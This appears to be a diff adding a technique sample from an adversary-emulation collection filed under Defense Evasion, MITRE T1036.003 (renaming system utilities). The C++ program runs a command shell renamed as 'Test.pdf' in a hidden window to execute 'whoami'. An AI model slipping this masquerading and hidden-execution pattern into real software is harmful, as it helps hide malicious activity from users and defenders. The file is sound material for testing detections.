@@ -1,0 +1,33 @@
+---
+title: ".003.Rename System Utilities"
+folder: "07. Defense Evasion/T1036 Masquerading"
+---
+
+
+#include <windows.h>
+#include <fstream>
+#include <iostream>
+
+
+void AutorunRegistryBackground4() {
+
+    const char* command = "C:\\Users\\User\\Desktop\\Test.pdf /c whoami > C:\\Users\\User\\Desktop\\test.txt";
+    STARTUPINFOA si = {};
+    si.cb = sizeof(STARTUPINFOA);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+
+    PROCESS_INFORMATION pi;
+
+
+    if (CreateProcessA(NULL, const_cast<LPSTR>(command), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
+}
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+
+    AutorunRegistryBackground4();
+    return 0;
+}
